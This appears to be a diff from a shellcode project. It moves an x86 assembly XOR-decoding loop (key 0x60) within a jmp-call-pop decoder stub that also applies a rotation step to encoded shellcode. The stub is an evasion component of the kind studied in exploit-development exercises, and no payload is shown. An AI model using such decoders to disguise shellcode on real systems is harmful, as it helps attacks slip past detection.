@@ -14,12 +14,6 @@ decoder:
 	pop esi
 	mov edi, esi ; saving address of Shellcode
 
-unxor:
-	xor byte [esi], 0x60
-	jz rot_127
-	inc esi
-	jmp short unxor
-
 rot_127:
 	cmp edi, 0x7F
 	jl low
@@ -39,6 +33,13 @@ low:
 norm:
 	inc edi
 	jmp rot_127
+
+unxor:
+        xor byte [esi], 0x60
+        jz rot_127
+        inc esi
+        jmp short unxor
+
 
 call_main:
 	call decoder
